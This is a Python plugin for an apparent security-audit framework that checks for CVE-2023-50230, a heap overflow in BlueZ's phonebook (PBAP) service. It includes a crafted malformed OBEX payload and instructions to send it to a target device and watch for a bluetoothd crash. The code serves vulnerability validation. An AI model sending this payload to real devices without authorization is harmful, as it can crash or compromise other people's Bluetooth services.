"""
PoC Name: BlueZ PBAP Heap Overflow RCE Audit
CVE: CVE-2023-50230
Category: Wireless
Severity: High
Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-50230
"""
from __future__ import annotations

from active_validation_core import run_active_validation
import sys

from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import build_local_sample_probe, write_temp_sample
from wireless_cve_audit import as_bool, local_version, version_tuple


VULN = {
    "cve": "CVE-2023-50230",
    "summary": "BlueZ PBAP malformed OBEX payload may trigger heap corruption in PBAP handling.",
    "component": "BlueZ PBAP",
    "type": "Heap overflow/RCE",
}


def _write_pbap_obex_sample() -> str:
    payload = (
        b"\x83"
        + (0x1400).to_bytes(2, "big")
        + b"\x42" + (0x1200).to_bytes(2, "big") + b"\xff" * 4096
        + b"\x4c" + (0x0100).to_bytes(2, "big") + b"B" * 256
    )
    return write_temp_sample("autosec_cve_2023_50230_", ".obex", payload)


def _pbap_probe(plugin, vuln):
    return build_local_sample_probe(
        plugin,
        sample_param="pbap_sample_path",
        command_params=("pbap_sender_cmd", "bluetooth_runner_cmd", "decoder_cmd"),
        generated_sample=_write_pbap_obex_sample,
        phenomenon="crafted PBAP/OBEX sample prepared for BlueZ PBAP heap-overflow observation",
        operator_action="Send sample_path to the target PBAP service via pbap_sender_cmd/bluetooth_runner_cmd and observe bluetoothd crash, restart, or ASAN output.",
    )


class BTBlueZPBAPHeapRCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-034"
    meta_poc_name = "BT BlueZ PBAP Heap RCE Audit"
    meta_cve_id = "CVE-2023-50230"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2023-50230"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2023-50230']
    meta_severity = "High"
    meta_protocol = "bluetooth"
    meta_target_os = ["linux"]
    meta_required_params = ["bluetooth_mac"]
    meta_profiles = ["bluetooth"]
    is_disruptive = True
    meta_destructive_level = "Restart"

    def check_prerequisites(self):
        self.target_mac = self.params.get("bluetooth_mac") or self.params.get("target_mac")
        if not self.target_mac:
            raise RuntimeError("需要 bluetooth_mac 或 target_mac")
        return True

    def exploit(self):
        version = local_version(self.params.get("bluez_version"), "bluetoothctl", "--version")
        parsed = version_tuple(version)
        affected = bool(parsed and (5, 66, 0) <= parsed < (5, 70, 0))
        pbap_enabled = as_bool(self.params.get("pbap_enabled"))
        self.params["software_inventory_text"] = (
            f"bluez_version={version or 'unknown'} pbap_enabled={pbap_enabled} target={self.target_mac}"
        )
        return run_active_validation(self, {
            **VULN,
            "cve": self.meta_cve_id,
            "signature_tokens": [self.meta_cve_id, "BlueZ", "PBAP", "bluetoothd", "5.66", "5.69"],
            "affected": [{"vendor": "BlueZ", "product": "BlueZ", "versions": [{"version": "5.66", "status": "affected", "lessThan": "5.70"}]}],
            "source_url": self.meta_source_url,
            "references": self.meta_references,
            "vendor_product": "BlueZ",
            "active_context": {
                "affected": affected,
                "pbap_enabled": pbap_enabled,
                "target_mac": self.target_mac,
            },
        }, probe=_pbap_probe)


if __name__ == "__main__":
    params = {"bluetooth_mac": sys.argv[1]} if len(sys.argv) > 1 else {}
    BTBlueZPBAPHeapRCEAuditPlugin(params).run_verify()
